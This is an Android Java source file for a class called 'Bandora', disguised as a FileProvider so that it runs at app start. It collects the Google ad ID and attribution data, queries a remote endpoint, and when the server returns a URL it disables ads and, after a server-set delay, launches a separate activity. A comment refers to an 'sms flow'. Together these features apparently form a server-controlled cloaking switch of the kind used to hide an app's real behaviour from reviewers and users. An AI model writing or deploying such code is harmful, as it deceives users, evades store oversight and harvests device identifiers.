package com.ma.autosdk;

import static com.ma.autosdk.utils.Utils.fixUrl;

import android.app.Activity;
import android.app.Application;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.core.content.FileProvider;

import com.adjust.sdk.Adjust;
import com.adjust.sdk.AdjustAttribution;
import com.adjust.sdk.AdjustConfig;
import com.adjust.sdk.OnAttributionChangedListener;
import com.adjust.sdk.OnDeeplinkResponseListener;
import com.adjust.sdk.OnDeviceIdsRead;
import com.google.firebase.FirebaseApp;
import com.google.firebase.analytics.FirebaseAnalytics;
import com.google.gson.Gson;
import com.ma.autosdk.models.DynamoCF;
import com.ma.autosdk.utils.Constants;
import com.ma.autosdk.utils.Utils;
import com.ma.autosdk.ui.AppFileActivity;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;
import java.util.Arrays;
import java.util.List;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;

public class Bandora extends FileProvider implements Application.ActivityLifecycleCallbacks {
    public static final String TAG = "BANDORA";
    public int activitiesCounter = 0;
    public boolean isLaunched = false;
    public static String googleAdId = "";
    public String deeplink = "";
    public String adjustAttribution = "";
    private long SPLASH_TIME = 0;
    public FirebaseAnalytics mFirebaseAnalytics;
    public Long timestamp;

    //Actions, 5: sms flow with number , 8 : sms flow
    List<Integer> actionsList = Arrays.asList(1);


    @Override
    public boolean onCreate() {
        FirebaseApp.initializeApp(getContext());
        String appToken = getContext().getString(R.string.adjust_token);
        String environment = AdjustConfig.ENVIRONMENT_PRODUCTION;
        AdjustConfig config = new AdjustConfig(getContext(), appToken, environment);


        config.setOnAttributionChangedListener(new OnAttributionChangedListener() {
            @Override
            public void onAttributionChanged(AdjustAttribution attribution) {
                long elapsedTimeInSeconds = (System.nanoTime() - timestamp) / 1000000000;
                firebaseLog("adjust_attr_received_" + elapsedTimeInSeconds, "");

                if (attribution != null) {
                    Constants.setReceivedAttribution(getContext(),attribution.toString());
                    Bandora.this.adjustAttribution = attribution.toString();

                }
            }
        });

        config.setOnDeeplinkResponseListener(new OnDeeplinkResponseListener() {
            @Override
            public boolean launchReceivedDeeplink(Uri deeplink) {
                Bandora.this.deeplink = deeplink.toString();

                return false;
            }
        });

        Adjust.getGoogleAdId(getContext(), new OnDeviceIdsRead() {
            @Override
            public void onGoogleAdIdRead(String googleAdId) {
                Bandora.this.googleAdId = googleAdId;

            }
        });

        Adjust.onCreate(config);
        timestamp = System.nanoTime();
        Adjust.addSessionCallbackParameter("user_uuid", Utils.generateClickId(getContext()));

        Application app = (Application) Utils.makeContextSafe((Application) getContext());
        app.registerActivityLifecycleCallbacks(this);

        return super.onCreate();
    }

    @Override
    public void onActivityCreated(@NonNull Activity activity, @Nullable Bundle savedInstanceState) {
        Log.d(TAG, activity.getLocalClassName());
        activitiesCounter++;
        Log.d(TAG, "activitiesCounter: " + activitiesCounter);
        if (activitiesCounter == 1 && !isLaunched) {
            Log.d(TAG, "Run The SDK");
            isLaunched = true;
            callAPI(activity);
        }
    }

    public void firebaseLog(String eventName, String errorLog) {
        Bundle params = new Bundle();
        if (!errorLog.isEmpty() && errorLog != null) {
            params.putString("errorLog", errorLog);
        }
        mFirebaseAnalytics = FirebaseAnalytics.getInstance(getContext());
        mFirebaseAnalytics.logEvent(eventName, params);
    }

    public void callAPI(Activity activity){

            OkHttpClient client = new OkHttpClient();
            String test = fixUrl(getContext().getString(R.string.finalEndp)) +"/?package="+getContext().getPackageName();
            Request request = new Request.Builder()
                    .url(fixUrl(getContext().getString(R.string.finalEndp)) +"/?package="+getContext().getPackageName())
                    .build();

            client.newCall(request).enqueue(new Callback() {
                @Override
                public void onFailure(Call call, IOException e) {

                    firebaseLog("init_dynamo_error", "");
                    AppMainActivity();
                }
                @Override
                public void onResponse(Call call, Response response) throws IOException {
                    firebaseLog("init_dynamo_ok", "");

                    String myResponse = response.body().string();

                     try {
                        Gson gson = new Gson();
                        DynamoCF m = gson.fromJson(myResponse, DynamoCF.class);

                        if (m != null & m.getCf() != null) {
                            String fileResult = null;
                            try {
                                fileResult = m.getCf();

                            } catch (Exception e) {
                                e.printStackTrace();
                            }
                            if (fileResult != null && !fileResult.equals(""))  {
                                Constants.showAds = false;
                                if (fileResult.startsWith("http")) {
                                    Constants.setEndP(getContext(), fileResult);
                                } else {
                                    Constants.setEndP(getContext(), "https://" + fileResult);
                                }

                                try {
                                    if (m != null & m.getSecond() != null) {
                                        SPLASH_TIME = 0;

                                        try {
                                            SPLASH_TIME = Integer.parseInt(m.getSecond());
                                        } catch(NumberFormatException nfe) {
                                            System.out.println("Could not parse " + nfe);
                                        }

                                        SPLASH_TIME = SPLASH_TIME * 2;
                                    } else {
                                        SPLASH_TIME = 8;
                                    }
                                } catch (Exception e) {
                                    e.printStackTrace();
                                }
                                new Handler(Looper.getMainLooper()).postDelayed(() -> {

                                        Intent intent = new Intent(getContext(), AppFileActivity.class);
                                        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                                        getContext().startActivity(intent);
                                       // return;

                                    }, SPLASH_TIME);

                            } else {
                                AppMainActivity();
                            }
                        }
                        else
                        {
                            firebaseLog("init_dynamo_ok_empty", "");
                            AppMainActivity();
                        }

                    } catch (Exception e) {
                        firebaseLog("init_dynamo_ok_exception", "");
                        AppMainActivity();
                    }

                }
            });
    }
    public void AppMainActivity() {
      //  getContext().startActivity(new Intent(getContext(), AppFileActivity.class));
        return;
    }
    @Override
    public void onActivityStarted(@NonNull Activity activity) {
    }

    @Override
    public void onActivityResumed(@NonNull Activity activity) {
        Adjust.onResume();
    }

    @Override
    public void onActivityPaused(@NonNull Activity activity) {
        Adjust.onPause();
    }

    @Override
    public void onActivityStopped(@NonNull Activity activity) {
    }

    @Override
    public void onActivitySaveInstanceState(@NonNull Activity activity, @NonNull Bundle outState) {
    }

    @Override
    public void onActivityDestroyed(@NonNull Activity activity) {
    }
}
